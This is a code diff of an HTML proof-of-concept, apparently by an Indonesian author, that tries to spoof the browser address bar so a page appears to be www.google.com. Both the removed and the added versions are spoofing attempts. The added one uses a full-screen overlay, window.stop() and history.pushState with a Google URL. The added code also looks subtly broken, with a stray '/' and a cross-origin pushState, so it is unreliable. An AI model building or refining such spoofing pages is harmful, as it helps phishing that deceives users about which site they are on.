@@ -5,26 +5,27 @@
     <title>Spoofing Test</title>
 </head>
 
-<body>
-    <button onclick="doSpoof()" style="padding:20px;">Jalankan Spoof Ke Google</button>
+<body style="margin:0; padding:0; overflow:hidden;">
+
+    <div id="my-content"
+        style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; display:none; text-align:center; padding-top:100px;">
+        <h1 style="color:red;">SPOOFED BY MHRDKAA</h1>
+        <p>Lihat Address Bar di atas. Jika berhasil, tulisannya www.google.com</p>
+    </div>
+
+    <button id="btn" onclick="startSpoof()" style="padding:20px; margin:50px;">GAS SPOOFING!</button>
 
     <script>
-        function doSpoof() {
-            let win = window.open("https://www.google.com/", "_blank");
-            let i = 0;
-            let timer = setInterval(() => {
-                i++;
-                try {
-                    win.document.write("<h1>SPOOFED: Ini bukan Google</h1>");
-                    win.document.write("<p>Tapi liat Address Bar di atas, tulisannya apa?</p>");
-                    win.stop();
-                    if (i > 10) {
-                        clearInterval(timer);
-                        win.document.close();
-                    }
-                } catch (e) {
-                }
-            }, 5);
+        function startSpoof() {
+            const btn = document.getElementById('btn');
+            const content = document.getElementById('my-content');
+            btn.style.display = 'none';
+            content.style.display = 'block';
+            location.href = "https://www.google.com/";
+            setTimeout(() => {
+                window.stop(); /
+                history.pushState(null, null, "https://www.google.com/search?q=spoofed");
+            }, 10);
         }
     </script>
 </body>
